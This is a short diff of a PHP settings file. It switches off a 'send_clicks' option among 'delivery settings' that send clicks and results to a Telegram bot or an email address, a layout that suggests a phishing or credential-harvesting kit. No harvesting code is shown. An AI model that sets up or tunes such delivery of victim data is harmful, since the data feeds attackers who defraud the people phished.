@@ -3,7 +3,7 @@
 
 $settings = array(
 	// DELIVERY SETTINGS
-	"send_clicks"   => "1", // Send Click To Your TG
+	"send_clicks"   => "0", // Send Click To Your TG
 	"send_mail"		=> "0", // Send E-Mail To Your Mail
 	"telegram"		=> "1", // Telegram Bots Receiver
 
